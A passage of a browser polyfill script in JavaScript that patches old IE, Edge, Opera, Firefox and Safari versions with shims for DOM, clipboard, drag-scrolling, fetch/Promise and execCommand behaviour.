          selection.selectAllChildren(copyFix);
          focusedNode.focus();
          window.setTimeout(function () {
            removeCopyFix();
          }, 0);
        }
      }
    };

    var addPasteFix = function () {
      var activeElement = document.activeElement;
      if (activeElement != undefined && activeElement.tagName.toLowerCase() !== 'input' && activeElement.tagName.toLowerCase() !== 'textarea') {
        var selection = window.getSelection();
        if (selection.isCollapsed) {
          var input = document.createElement('input');
          input.style.position = 'absolute';
          input.style.overflow = 'hidden';
          input.style.width = '0px';
          input.style.height = '0px';
          input.style.display = 'inline-block';
          activeElement.appendChild(input);
          input.focus();
          window.setTimeout(function () {
            input.parentNode.removeChild(input);
            activeElement.focus();
          }, 0);
        }
      }
    };

    document.addEventListener("keydown", function (event) {
      if (event.keyCode === "C".charCodeAt(0) && (event.ctrlKey || event.metaKey) && !event.altKey && !event.shiftKey && !event.defaultPrevented) {
        addCopyFix();
      }
      if (event.keyCode === "V".charCodeAt(0) && (event.ctrlKey || event.metaKey) && !event.altKey && !event.shiftKey && !event.defaultPrevented) {
        addPasteFix();
      }
    }, false);

    var nativeExecCommand = document.execCommand;
    document.execCommand = function (name, showDefaultUI, value) {
      if (name === "copy") {
        addCopyFix();
      }
      return nativeExecCommand.call(this, name, showDefaultUI, value);
    };

    document.addEventListener("copy", function (event) {
      removeCopyFix();
    }, false);
  }, 0);
}

// Chrome < 20, Safari < 6, Firefox < 5
if (HTMLElement.prototype.click == undefined) {
  HTMLElement.prototype.click = function (element) {
    var event = document.createEvent("MouseEvent");
    event.initMouseEvent("click", true, true, window, 1, 0, 0, 0, 0, false, false, false, false, 0, undefined);
    this.dispatchEvent(event);
  };
}

// Firefox < 9
if (Node.prototype.contains == undefined) {
  Node.prototype.contains = function (otherNode) {
    var x = otherNode;
    while (x != undefined && x !== this) {
      x = x.parentNode;
    }
    return x != undefined;
  };
}


// Scrolling while you're dragging
// Chrome 49 - OK, Opera 12 - OK, IE 8 - not OK, IE 11 - OK, Firefox < 53
// https://bugzilla.mozilla.org/show_bug.cgi?id=41708
// TypeError: Cannot use 'in' operator to search for 'mozCursor' in undefined in Safari
if ((window.DataTransfer != undefined && window.DataTransfer.prototype != undefined && "mozCursor" in window.DataTransfer.prototype && !("caretColor" in document.documentElement.style)) || window.XDomainRequest != undefined) {
  (function () {
    var getScrollDelta = function (distanceToStartEdge, distanceToEndEdge) {
      return distanceToStartEdge < 16 ? -Math.pow(16 - distanceToStartEdge, 2) : (distanceToEndEdge < 16 ? +Math.pow(distanceToEndEdge - 16, 2) : 0);
    };
    var lastScrollTop = 0;
    var lastScrollLeft = 0;
    document.addEventListener('dragover', function (event) {
      if (lastScrollTop === window.pageYOffset || lastScrollLeft === window.pageXOffset) { // The skip if the web browser has the support of this feature
        var dy = getScrollDelta(event.clientY, window.innerHeight - event.clientY);
        var dx = getScrollDelta(event.clientX, window.innerWidth - event.clientX);
        if (dy !== 0 || dx !== 0) {
          window.scrollBy(dx, dy);
        }
      }
      lastScrollTop = window.pageYOffset;
      lastScrollLeft = window.pageXOffset;
    }, false);
  }());
}

// https://bugzilla.mozilla.org/show_bug.cgi?id=688580 (Firefox < 31)
if ("MozBackgroundInlinePolicy" in document.documentElement.style && document.readyState === "interactive") {
  (function () {
    var contentLoadedTimeoutId = 0;
    var onTimeout = function () {
      contentLoadedTimeoutId = window.setTimeout(onTimeout, 10);
      if (document.readyState === "complete") {
        var event = document.createEvent("Event");
        event.initEvent("DOMContentLoaded", false, false);
        document.dispatchEvent(event);
      }
    };
    onTimeout();
    document.addEventListener("DOMContentLoaded", function (event) {
      window.clearTimeout(contentLoadedTimeoutId);
    }, false);
  }());
}

// Chrome < 4, Firefox < 4, IE < 9, Opera < 11, Safari < 5
if (!("head" in document)) {
  document.head = document.documentElement.firstElementChild;
}


// IE ? - IE 11
// Negative event.clientX and event.clientY when using "element.click()" or when a user presses Enter on <button>
if (window.clipboardData != undefined && window.MouseEvent != undefined) {
  var redefineClientXY = function (property) {
    var clinetXDescriptor = Object.getOwnPropertyDescriptor(window.MouseEvent.prototype, "clientX");
    var clinetYDescriptor = Object.getOwnPropertyDescriptor(window.MouseEvent.prototype, "clientY");
    Object.defineProperty(window.MouseEvent.prototype, property, {
      get: function () {
        if (this.screenX === 0 && this.screenY === 0) {
          return 0; // IE 11
        }
        var rect = this.target.getBoundingClientRect();
        var x = clinetXDescriptor.get.call(this);
        var y = clinetYDescriptor.get.call(this);
        return x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom ? (property === "clientX" ? x : y) : 0;
      }
    });
  };
  redefineClientXY("clientX");
  redefineClientXY("clientY");
}

//TODO: more simple test - ?
// IE 8 - IE 9
if (!("hidden" in document.documentElement)) {
  var tmp = document.createElement('div');
  tmp.innerHTML = '&ii;';
  if (tmp.textContent === '&ii;') {
    var P = HTMLElement.prototype;
    var innerHTML = Object.getOwnPropertyDescriptor(P, 'innerHTML');
    if (innerHTML == null) {
      P = HTMLDivElement.prototype;
      innerHTML = Object.getOwnPropertyDescriptor(P, 'innerHTML'); // Firefox 3.6
    }
    if (innerHTML != null) {
      Object.defineProperty(P, 'innerHTML', {
        get: function () {
          return innerHTML.get.call(this);
        },
        set: function (value) {
          var s = value.replace(/&[a-zA-Z]+;/g, function (p) {
            switch (p) {
              case '&af;': return '&#x2061;';
              case '&it;': return '&#x2062;';
              case '&ic;': return '&#x2063;';
              case '&ii;': return '&#x2148;';
              case '&vellip;': return '&#x22EE;';
              case '&UnderBrace;': return '&#x23DF;';
            }
            return p;
          });
          innerHTML.set.call(this, s);
        }
      });
    }
  }
}

// Chrome < 6, Firefox < 4, IE < 11, Opera < 11, Safari < 5.1
// https://codepen.io/valtlai/pen/wKyodg
if (!("hidden" in document.documentElement)) {
  Object.defineProperty(HTMLElement.prototype, "hidden", {
    get: function () {
      return this.getAttribute("hidden") != undefined;
    },
    set: function (value) {
      if (value !== "hidden") {// IE 8
        if (value) {
          this.setAttribute("hidden", "hidden");
        } else {
          this.removeAttribute("hidden");
        }
      }
    }
  });
}

// IE ? - IE 11 - <math><mrow id="test"><mn>1</mn></mrow></math>
if (window.clipboardData != undefined) {
  document.nativeGetElementById = document.getElementById;
  document.getElementById = function (id) {
    return document.nativeGetElementById(id) || (/^[_a-zA-Z0-9\-]+$/.exec(id) != undefined ? document.querySelector("[id=\"" + id + "\"]") : undefined);
  };
}

// Edge < 18, Safari < 11, Chrome < 61, Firefox < 45, Opera 12
if (Element.prototype.getAttributeNames == undefined) {
  Element.prototype.getAttributeNames = function () {
    var attributes = this.attributes;
    var length = attributes.length;
    var result = new Array(length);
    for (var i = 0; i < length; i += 1) {
      result[i] = attributes[i].name;
    }
    return result;
  };
}

//? some strange browser (bot)
if (Element.prototype.hasAttributes == undefined) {
  Element.prototype.hasAttributes = function () {
    return this.attributes.length > 0;
  };
}

if (window.navigator != undefined) {
  var connection = window.navigator.connection;
  // Note: `"connection" in window.navigator` is true in SamsungBrowser/1.1 Mobile Safari/537.3
  if (connection != undefined) {
    if (!("effectiveType" in connection)) {
      var type = connection.type;
      if (typeof type === "number") {
        // Android 4.1 - 4.4, UC Browser for Android 10.10 - 11.3
        connection.effectiveType = (connection.type === connection.CELL_2G ? "2g" : "unknown");
      } else {
        if ("downlinkMax" in connection) {
          // Chrome Mobile <= 60
          connection.effectiveType = connection.downlinkMax <= 70 ? "2g" : "unknown";
        }
      }
    }
    if (!("saveData" in connection)) {
      if ("metered" in connection) {
        connection.saveData = connection.metered;
      }
    }
  }
}

// https://dev.to/corbindavenport/how-to-correctly-check-for-do-not-track-with-javascript-135d
// IE 11
if (window.navigator != undefined) {
  if ("doNotTrack" in window && !("doNotTrack" in window.navigator)) {
    Object.defineProperty(window.navigator, "doNotTrack", {
      get: function () {
        return window.doNotTrack;
      }
    });
  }
}

// Opera < 11.50, Firefox < 4, IE < 10
if (window.console == undefined) {
  var consoleLog = function (s) {
    if (window.opera != undefined && window.opera.postError != undefined) {
      window.opera.postError(s);
    }
  };
  window.console = {
    log: consoleLog,
    info: consoleLog,
    warn: consoleLog,
    error: consoleLog
  };
}

// Firefox < 5  - https://bugzilla.mozilla.org/show_bug.cgi?id=616742#c30
if (window.console.debug == undefined) {
  window.console.debug = function (x) {
    window.console.log(x);
  };
}

//?
if (window.console.assert == undefined) {
  window.console.assert = function (x) {
    if (!x) {
      window.console.error("assertion failed");
    }
  };
}

if (window.console.time == undefined) {
  window.console.time = function () {
  };
}
if (window.console.timeEnd == undefined) {
  window.console.timeEnd = function () {
  };
}
if (window.console.count == undefined) {
  window.console.count = function () {
  };
}


// IE < 10
if (window.DataTransfer != null && !("types" in window.DataTransfer.prototype)) {
  Object.defineProperty(window.DataTransfer.prototype, "types", {
    get: function () {
      return ["Text"];
    },
    configurable: true
  });
}

// IE 11, Edge < 17
if (window.DataTransfer != undefined && !("oncopy" in document)) {
  var nativeSetData = window.DataTransfer.prototype.setData;
  window.DataTransfer.prototype.setData = function (type, data) {
    try {
      nativeSetData.call(this, type === "text/plain" ? "Text" : type, data);
    } catch (error) {
      window.console.log(error);
    }
  };
  var nativeGetData = window.DataTransfer.prototype.getData;
  window.DataTransfer.prototype.getData = function (type) {
    try {
      return nativeGetData.call(this, type === "text/plain" ? "Text" : type);
    } catch (error) {
      window.console.log(error);
    }
    return null;
  };
}

// Opera 12, IE?, window.DataTransfer is not an object in Opera Mini Classic
if (window.DataTransfer != undefined && (!("oncopy" in document) || window.opera != null)) {
  var nativeTypes = Object.getOwnPropertyDescriptor(window.DataTransfer.prototype, "types");
  Object.defineProperty(window.DataTransfer.prototype, "types", {
    get: function () {
      var types = nativeTypes.get.call(this) || ["Text"]; // null in IE 11
      var t = new Array(types.length);
      for (var i = 0; i < types.length; i += 1) {
        var type = types[i];
        t[i] = type === "Text" ? "text/plain" : type;
      }
      return t;
    },
    configurable: true
  });
}

if (HTMLInputElement.prototype.setSelectionRange == undefined) { // Opera Mini
  HTMLInputElement.prototype.setSelectionRange = function (start, end) {
    this.selectionStart = start;
    this.selectionEnd = end;
  };
}
if (HTMLTextAreaElement.prototype.setSelectionRange == undefined) { // Opera Mini
  HTMLTextAreaElement.prototype.setSelectionRange = function (start, end) {
    this.selectionStart = start;
    this.selectionEnd = end;
  };
}

// IE 8 - IE 11
// "scrollIntoView" behaviour for setSelectionRange
if (Object.getOwnPropertyDescriptor != undefined && HTMLInputElement.prototype.createTextRange != undefined) {
  var fixSetSelectionRange = function (C) {
    var setSelectionRange = C.prototype.setSelectionRange;
    C.prototype.setSelectionRange = function (selectionStart, selectionEnd, selectionDirection) {
      setSelectionRange.call(this, selectionStart, selectionEnd, selectionDirection);
      var textRange = this.createTextRange();
      textRange.moveStart("character", this.selectionStart);
      textRange.moveEnd("character", this.selectionEnd - this.value.length);
      textRange.scrollIntoView(true);
    };
  };
  fixSetSelectionRange(HTMLInputElement);
  fixSetSelectionRange(HTMLTextAreaElement);
}

// IE 8 - IE 10
// see https://github.com/codemirror/CodeMirror/commit/63591907b0dcd51c2f64dc967143e044ecac6923
if (Object.getOwnPropertyDescriptor != undefined && HTMLInputElement.prototype.createTextRange != undefined && document.attachEvent != undefined) {
  var originalGetBoundingClientRect = TextRange.prototype.getBoundingClientRect;
  TextRange.prototype.getBoundingClientRect = function () {
    var zoomX = window.screen.logicalXDPI / window.screen.deviceXDPI;
    var zoomY = window.screen.logicalYDPI / window.screen.deviceYDPI;
    var rect = originalGetBoundingClientRect.call(this);
    return {
      top: rect.top * zoomY,
      right: rect.right * zoomX,
      bottom: rect.bottom * zoomY,
      left: rect.left * zoomX,
      height: (rect.bottom - rect.top) * zoomY,
      width: (rect.right - rect.left) * zoomX
    };
  };
}

// https://connect.microsoft.com/IE/feedback/details/1015764/ie11-scrollleft-for-text-input-elements-is-always-0
// IE 11, Edge has problems with input.scrollLeft (always 0)
// IE 10 - IE 11 - input.scrollWidth
// see also https://github.com/gregwhitworth/scrollWidthPolyfill/
if (Object.getOwnPropertyDescriptor != undefined && HTMLInputElement.prototype.createTextRange != undefined) {
  var fixScrollProperty = function (property) {
    var originalScrollProperty = Object.getOwnPropertyDescriptor(Element.prototype, property);
    if (originalScrollProperty != undefined) {
      Object.defineProperty(Element.prototype, property, {
        get: function () {
          if (this.tagName.toLowerCase() !== 'input') {
            return originalScrollProperty.get.call(this);
          }
          var inputElement = this;
          var textRange = inputElement.createTextRange();
          var inputStyle = window.getComputedStyle(inputElement, undefined);
          var paddingLeft = Number.parseFloat(inputStyle.paddingLeft);
          var paddingRight = Number.parseFloat(inputStyle.paddingRight);
          var rangeRect = textRange.getBoundingClientRect();
          var scrollLeft = inputElement.getBoundingClientRect().left + inputElement.clientLeft + paddingLeft - rangeRect.left;
          var clientWidth = inputElement.clientWidth;
          var contentWidth = paddingLeft + (rangeRect.right - rangeRect.left) + paddingRight;
          var scrollWidth = clientWidth > contentWidth ? clientWidth : contentWidth;
          return property === "scrollLeft" ? scrollLeft : scrollWidth;
        },
        set: function (value) { // Note: it is not possible to use `originalScrollProperty.set` here in IE 8-?
          return originalScrollProperty.set.call(this, value);
        }
      });
    }
    fixScrollProperty("scrollLeft");
    //fixScrollProperty("scrollWidth");
  };
}


// IE <= 11, Opera <= 12, Firefox < 20 (caretPositionFromPoint)
if (document.caretPositionFromPoint == undefined && document.caretRangeFromPoint == undefined) {
  document.caretRangeFromPoint = function (x, y) {
    var getBoundingClientRect = function (textNode, startOffset, endOffset) {
      // Firefox 3.6 does not support Range#getBoundingClientRect
      //var range = document.createRange();
      //range.setStart(textNode, startOffset);
      //range.setEnd(textNode, endOffset); // Opera 12 needs a not collapsed range, seems
      //return range.getBoundingClientRect();
      var span = document.createElement('span');
      textNode.parentNode.insertBefore(span, textNode);
      textNode.parentNode.removeChild(textNode);
      var a = document.createElement('span');
      a.textContent = textNode.data.slice(0, startOffset);
      var b = document.createElement('span');
      b.textContent = textNode.data.slice(startOffset, endOffset);
      var c = document.createElement('span');
      c.textContent = textNode.data.slice(endOffset);
      span.appendChild(a);
      span.appendChild(b);
      span.appendChild(c);
      var rect = b.getBoundingClientRect();
      span.parentNode.insertBefore(textNode, span);
      span.parentNode.removeChild(span);
      return rect;
    };
    var element = document.elementFromPoint(x, y);
    var walk = function (candidate, e, x, y) {
      var node = candidate;
      var c = e.firstChild;
      if (c == undefined && e.nodeType === Node.TEXT_NODE && e.parentNode.tagName.toLowerCase() !== 'textarea') {
        var rect = getBoundingClientRect(e, 0, e.data.length);
        if (x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom) {
          node = e;
        }
      }
      while (c != undefined) {
        node = walk(node, c, x, y);
        c = c.nextSibling;
      }
      return node;
    };
    var node = walk(element, element, x, y);
    var index = 0;
    var c = node.parentNode.firstChild;
    while (c !== node) {
      index += 1;
      c = c.nextSibling;
    }
    var resultContainer = node.parentNode;
    var resultOffset = index;
    if (node.nodeType === Node.TEXT_NODE) {
      var length = node.data.length;
      var min = 1 / 0;
      for (var i = 0; i < length; i += 1) {
        var rect = getBoundingClientRect(node, i, i + 1);
        var d = x - (rect.left + rect.right) / 2;
        var distance = d < 0 ? 0 - d : 0 + d;
        if (distance < min && y >= rect.top && y <= rect.bottom) { // && rect.right === rect.left
          resultContainer = node;
          resultOffset = i;
          min = distance;
        }
      }
    }
    return {
      startContainer: resultContainer,
      startOffset: resultOffset,
      endContainer: resultContainer,
      endOffset: resultOffset + 1,
      commonAncestorContainer: resultContainer
    };
  };
}

// Firefox does not support "contextMenu" on MathML elements
// HTMLElement#hasOwnProperty does not exist in IE 8
if (Object.prototype.hasOwnProperty.call(HTMLElement.prototype, 'contextMenu')) {
  document.addEventListener('contextmenu', function (event) {
    var target = event.target.closest('[contextmenu]');
    if (target != null) {
      document.documentElement.setAttribute('contextmenu', target.getAttribute('contextmenu'));
    } else {
      document.documentElement.removeAttribute('contextmenu');
    }
  }, false);
}

// TODO: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/4365703/
// IE 11
// The default value is 0 if the element is an a, area, button, frame, iframe, input, object, select, textarea, or SVG a element, or is a summary element that is a summary for its parent details. The default value is âˆ’1 otherwise.
if (document.createElement('div').tabIndex === 0) {
  delete HTMLElement.prototype.tabIndex;
  Object.defineProperty(Element.prototype, 'tabIndex', {
    get: function () {
      var tabIndex = this.getAttribute('tabindex');
      if (tabIndex != null) {
        if (this.namespaceURI === 'http://www.w3.org/1998/Math/MathML') {//TODO: ?
          return -1; // as we cannot polyfill Element#focus ...
        }
        return Number(tabIndex);
      }
      var tagName = this.tagName.toLowerCase();
      if (/^(?:a|button|input|select|textarea|summary)$/.test(tagName)) {
        return 0;
      }
      return -1;
    },
    set: function (value) {
      this.setAttribute('tabindex', value);
    }
  });
}



if ('MSBlobBuilder' in window) {
  // to fix an issue in Edge 18: enter key event is fired even when the user selects something from the datalist?/the list of previously enter values
  document.addEventListener('keydown', function (event) {
    var input = event.target;
    if (input.tagName.toLowerCase() === 'input' && input.getAttribute('list') == null) {
      var DOM_VK_DOWN = 40;
      if (event.keyCode === DOM_VK_DOWN) {
        input.setAttribute('data-disallow-enter', 'true');
      }
      var DOM_VK_ESCAPE = 27;
      if (event.keyCode === DOM_VK_ESCAPE) {
        input.removeAttribute('data-disallow-enter');
      }
      var DOM_VK_RETURN = 13;
      if (event.keyCode === DOM_VK_RETURN) {
        if (input.getAttribute('data-disallow-enter') != null) {
          input.removeAttribute('data-disallow-enter');
          event.stopImmediatePropagation();
        }
      }
    }
  }, true);
}

// in Opera 12 a getter on Element.prototype somehow handles the access to html elements
if (!("innerHTML" in HTMLElement.prototype) && Object.getOwnPropertyDescriptor(document.documentElement, 'innerHTML') != null) {
	Object.defineProperty(HTMLElement.prototype, 'innerHTML', Object.getOwnPropertyDescriptor(document.documentElement, 'innerHTML'));
}

//IE 11, Firefox 4 - ?, Safari 5.1 - ?, Chrome ?, Opera 12.18
if (!("innerHTML" in Element.prototype)) {
  Object.defineProperty(Element.prototype, 'innerHTML', {
    get: function () {
      var tmp = document.createElement('div');
      for (var child = this.firstChild; child != null; child = child.nextSibling) {
        tmp.appendChild(child.cloneNode(true));
      }
      return tmp.innerHTML;
    },
    set: function (value) {
      var xml = document.createElement('div');
      xml.innerHTML = value;
      while (this.firstChild != null) {
        this.firstChild.parentNode.removeChild(this.firstChild);
      }
      while (xml.firstChild != null) {
        this.appendChild(xml.firstChild);
      }
    },
    configurable: true
  });
}


// TODO: Firefox bug, Edge bug
// Firefox does not scroll while dragover for <input>
// IE does not scorll while dragover for <input>
if (!("webkitUserDrag" in document.documentElement.style)) { //TODO: proper detection
  var lastScrollLeft = 0;
  document.addEventListener('dragover', function (event) {
    var input = event.target;//document.elementFromPoint(event.clientX, event.clientY);
    if (input.tagName.toLowerCase() === 'input') {
      if (lastScrollLeft === input.scrollLeft) { // The skip if the web browser has the support of this feature
        var rect = input.getBoundingClientRect();
        var distanceToLeftEdge = event.clientX - rect.left;
        var distanceToRightEdge = input.clientWidth - (event.clientX - rect.left);
        var dx = distanceToLeftEdge < 9 ? -6 : (distanceToRightEdge < 9 ? +6 : 0);
        dx = Math.max(dx, -input.scrollLeft);
        //dx = Math.min(dx, input.scrollWidth - input.clientWidth);
        if (dx !== 0) {
          //input.scrollBy(dx, 0);
          input.scrollLeft = input.scrollLeft + dx;// input.scrollBy() is not supported in Edge 18
        }
      }
      lastScrollLeft = input.scrollLeft;
    }
  }, false);
}





if (!('enterKeyHint' in HTMLInputElement.prototype)) {
  Object.defineProperty(HTMLInputElement.prototype, 'enterKeyHint', {
    get: function (value) {
      return input.getAttribute('mozactionhint');
    },
    set: function (value) {
      var input = this;
      input.setAttribute('mozactionhint', value);//?
    }
  });
}




  if (window.fetch == null) {
    if (window.Promise == null) {
      window.Promise = function (f) {
        this._q = null;
        this._e = null;
        var that = this;
        f(function (result) {
          if (that._q != null) {
            that._q(result);
          }
        }, function (error) {
          if (that._e != null) {
            that._e(error);
          }
        });
      };
      window.Promise.prototype.then = function (c, e) {
        var that = this;
        return new window.Promise(function (resolve, reject) {
          that._q = function (result) {
            if (c != null) {
              window.Promise.resolve(c(result)).then(resolve, reject);
            } else {
              resolve(result);
            }
          };
          that._e = function (error) {
            if (e != null) {
              window.Promise.resolve(e(error)).then(resolve, reject);
            } else {
              reject(error);
            }
          };
        });
      };
      window.Promise.prototype["catch"] = function (onRejected) {
        // https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch
        return this.then(undefined, onRejected);
      };
      window.Promise.resolve = function (value) {
        if (value != null && typeof value.then === "function") {
          return value;
        }
        return new window.Promise(function (resolve, reject) {
          window.setTimeout(function () {
            resolve(value);
          }, 0);
        });
      };
    }
    window.Response = function (xhr) {
      this.xhr = xhr;
    };
    window.Response.prototype.json = function () {
      var json = this.xhr.response;
      return Promise.resolve(json != null && typeof json !== "string" ? json : JSON.parse(json || this.xhr.responseText));
    };
    window.Response.prototype.text = function () {
      return Promise.resolve(this.xhr.response || this.xhr.responseText);
    };
    window.fetch = function (url) {
      return new Promise(function (resolve, reject) {
        var xhr = new window.XMLHttpRequest();
        xhr.open('GET', url, true);
        try {
          xhr.responseType = url.indexOf('.json') !== -1 ? 'json' : 'text';
        } catch (error) {
          // Safari 5.1.7 throws an error for "json" response type.
          //TODO: ??? add the note to MDN
        }
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4) {
            // XMLHttpRequest#responseText throws InvalidStateError in Opera 12 when XMLHttpRequest#responseType is used and has value "json"
            if (xhr.response != null || xhr.responseText !== '') {
              resolve(new window.Response(xhr));
            } else {
              reject(new Error());
            }
          }
        };
        xhr.send(null);
      });
    };
  }



// https://developer.mozilla.org/en-US/docs/Web/API/ParentNode/childElementCount#Polyfill_for_IE8_IE9_Safari
if (!('childElementCount' in Element.prototype)) {
  Object.defineProperty(Element.prototype, 'childElementCount', {
    get: function() {
      var count = 0;
      var child = this.firstElementChild;
      while (child != null) {
        count += 1;
        child = child.nextElementSibling;
      }
      return count;
    }
  });
}


/*
 * DOMParser HTML extension
 * 2019-11-13
 *
 * By Eli Grey, http://eligrey.com
 * Public domain.
 * NO WARRANTY EXPRESSED OR IMPLIED. USE AT YOUR OWN RISK.
 */

/*! @source https://gist.github.com/1129031 */

function isHTMLParsingSupported() {
	try {
		// WebKit returns null on unsupported types
		if (new DOMParser().parseFromString("", "text/html") != null) {
			// text/html parsing is natively supported
			return true;
		}
	} catch (exception) {
    // Firefox/Opera/IE throw errors on unsupported types
  }
  return false;
}

if (!isHTMLParsingSupported("")) {//TODO: optimize the check
	var nativeParseFromString = DOMParser.prototype.parseFromString;
  DOMParser.prototype.parseFromString = function (markup, type) {
    if (type === "text/html") {
      var doc = document.implementation.createHTMLDocument("");
      doc.documentElement.innerHTML = markup;
      return doc;
    }
    return nativeParseFromString.call(this, markup, type);
  };
}


// Firefox 2: https://javascript.ru/ui/offset
if (Element.prototype.getBoundingClientRect == null) {
  Element.prototype.getBoundingClientRect = function () {
    var top = 0;
    var left = 0;
    var x = this;
    while (x != null) {
      top += x.offsetTop;
      left += x.offsetLeft;
      x = x.offsetParent;
    }
    return {
      top: top,
      left: left,
      right: left + this.offsetWidth,
      bottom: top + this.offsetHeight
    };
  };
}

if ("msCSSOMElementFloatMetrics" in document) {
  document.msCSSOMElementFloatMetrics = true;
}

// https://developer.mozilla.org/en-US/docs/Web/API/Element/matches#Polyfill
if (!Element.prototype.matches) {
  Element.prototype.matches =
      Element.prototype.matchesSelector ||
      Element.prototype.mozMatchesSelector ||
      Element.prototype.msMatchesSelector ||
      Element.prototype.oMatchesSelector ||
      Element.prototype.webkitMatchesSelector ||
      function(s) {
        var matches = (this.document || this.ownerDocument).querySelectorAll(s),
            i = matches.length;
        while (--i >= 0 && matches.item(i) !== this) {}
        return i > -1;
      };
}

// https://developer.mozilla.org/en-US/docs/Web/API/Element/closest#Polyfill
if (!Element.prototype.closest) {
  Element.prototype.closest = function(s) {
    var el = this;

    do {
      if (el.matches(s)) { return el; }
      el = el.parentElement || el.parentNode;
    } while (el !== null && el.nodeType === 1);
    return null;
  };
}

if (document.queryCommandSupported == undefined) { // ... undefined in Opera Mini 35 - ?
  document.queryCommandSupported = function () {
    return false;
  };
}
if (document.queryCommandEnabled == undefined) { // ... undefined in Opera Mini 35 - ?
  document.queryCommandEnabled = function () {
    return false;
  };
}

if (typeof BigInt === "undefined") { // stip tests for modern browsers as they cause style recalcuation and relayout

var nativeQueryCommandSupported = document.queryCommandSupported;
var nativeQueryCommandEnabled = document.queryCommandEnabled;

try {
  // `document.queryCommandEnabled(command)` throws an error in Firefox ? - 4 - ?
  document.queryCommandSupported("copy"); // check if it throws
  document.queryCommandSupported("insertText"); // check if it throws
} catch (error) {
  document.queryCommandSupported = function (command) {
    try {
      return nativeQueryCommandSupported.call(document, command);
    } catch (error) {
    }
    return false;
  };
}

try {
  // `document.queryCommandEnabled(command)` throws an error in IE 8 - 11 - ?
  document.queryCommandEnabled("copy"); // check if it throws
  document.queryCommandEnabled("insertText"); // check if it throws
} catch (error) {
  document.queryCommandEnabled = function (command) {
    if (document.queryCommandSupported(command)) {
      try {
        return nativeQueryCommandEnabled.call(document, command);
      } catch (error) {
      }
    }
    return false;
  };
  // `document.queryCommandEnabled("copy")` throws an error in Firefox < 41 for "copy", but `document.queryCommandSupported("copy")` incorrectly returns true
  // Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0 for "insertText"
  if (document.queryCommandSupported("copy")) {
    var nativeQueryCommandSupported1 = document.queryCommandSupported;
    document.queryCommandSupported = function (command) {
      if (nativeQueryCommandSupported1.call(document, command)) {
        try {
          nativeQueryCommandEnabled.call(document, command); // check if it throws
          return true;
        } catch (error) {
        }
      }
      return false;
    };
  }
}

var isInsertTextWorking = function () {
  var activeElement = document.activeElement;
  var input = document.createElement('input');
  input.style.position = 'fixed';
  input.style.top = '0';
  input.style.left = '0';
  document.body.appendChild(input);
  input.focus();
  var result = false;
  if (document.queryCommandEnabled('insertText')) {
    document.execCommand('insertText', false, 'test');
    result = document.queryCommandEnabled('undo');
    document.execCommand('undo', false, '');
  }
  input.parentNode.removeChild(input);
  activeElement.focus();
  return result;
};

if (document.queryCommandSupported("ms-beginUndoUnit") &&
    document.queryCommandSupported("ms-endUndoUnit") &&
    (!document.queryCommandSupported("insertText") || !isInsertTextWorking())) {
  // "insertText" is enabled for Edge 17, but "undo" does not work correctly with it, so let's try to use ms-beginUndoUnit+ms-endUndoUnit
  var nativeExecCommand2 = document.execCommand;
  document.execCommand = function (name, showDefaultUI, value) {
    var input = document.activeElement;
    if (name === "insertText" && input != null && (input.tagName.toLowerCase() === 'input' || input.tagName.toLowerCase() === 'textarea')) {
      var currentValue = input.value;
      var selectionStart = input.selectionStart;
      var selectionEnd = input.selectionEnd;
      document.execCommand("ms-beginUndoUnit", false, null);
      input.value = currentValue.slice(0, selectionStart) + value + currentValue.slice(selectionEnd);
      document.execCommand("ms-endUndoUnit", false, null);
      input.setSelectionRange(selectionStart + value.length, selectionStart + value.length);
      if (value !== "" || selectionStart !== selectionEnd) { // to match Chrome's behaviour
        var inputEvent = document.createEvent("Event");
        inputEvent.initEvent("input", false, false);
        input.dispatchEvent(inputEvent);
      }
      return undefined;
    }
    return nativeExecCommand2.call(this, name, showDefaultUI, value);
  };
  if (!document.queryCommandSupported("insertText")) {
    var nativeQueryCommandEnabled2 = document.queryCommandEnabled;
    var nativeQueryCommandSupported2 = document.queryCommandSupported;
    document.queryCommandEnabled = function (command) {
      if (command === "insertText") {
        return true;
      }
      return nativeQueryCommandEnabled2.call(document, command);
    };
    document.queryCommandSupported = function (command) {
      if (command === "insertText") {
        return true;
      }
      return nativeQueryCommandSupported2.call(document, command);
    };
  }
}

}

// Firefox < 7
// optional useCapture argument
//! The polyfill does not work as Firefox 3.6.28 has the functions on the objects as well as on the prototypes....
//! works fine in Firefox 4
var useCaptureSupported = true;
try {
  var useCaptureTest = function (event) {
  };
  document.addEventListener("abc", useCaptureTest);
  document.removeEventListener("abc", useCaptureTest);
} catch (error) {
  useCaptureSupported = false;
}

if (!useCaptureSupported) {
  (function () {
    var fix = function (object) {
      // in Firefox 3 document has own property addEventListener, but not removeEventListener
      if (Object.prototype.hasOwnProperty.call(object, "addEventListener")) {
        var addEventListener = object.addEventListener;
        object.addEventListener = function (type, listener, useCapture) {
          addEventListener.call(this, type, listener, useCapture == undefined ? false : useCapture);
        };
      }
      if (Object.prototype.hasOwnProperty.call(object, "removeEventListener")) {
        var removeEventListener = object.removeEventListener;
        object.removeEventListener = function (type, listener, useCapture) {
          removeEventListener.call(this, type, listener, useCapture == undefined ? false : useCapture);
        };
      }
    };
    var fixUseCapture = function (object) {
      while (object != undefined) {
        fix(object);
        object = Object.getPrototypeOf(object);
      }
    };
    fixUseCapture(document);
    fixUseCapture(window);
    // can be polyfilled in Firefox 4...
    fixUseCapture(HTMLInputElement.prototype);
    fixUseCapture(HTMLTextAreaElement.prototype);
  }());
}

/*
if (window.addEventListener.length !== 2) {//TODO: ?
  var nativeAddEventListener = window.addEventListener;
  window.addEventListener = function (type, callback, useCapture) {
    nativeAddEventListener.call(this, type, callback, useCapture || false);
  };
}
if (document.addEventListener.length !== 2) {//TODO: ?
  var nativeAddEventListener2 = document.addEventListener;
  document.addEventListener = function (type, callback, useCapture) {
    nativeAddEventListener2.call(this, type, callback, useCapture || false);
  };
}
*/

if (typeof DOMRect === "undefined") {
  globalThis.DOMRect = function (x, y, width, height) {
    return {
      x: x,
      y: y,
      width: width,
      height: height,
      top: y,
      right: x + width,
      bottom: y + height,
      left: x
    };
  };
}

if (!("parentElement" in Node.prototype)) { //!Note: the polyfill should work for MathML-elements as well.
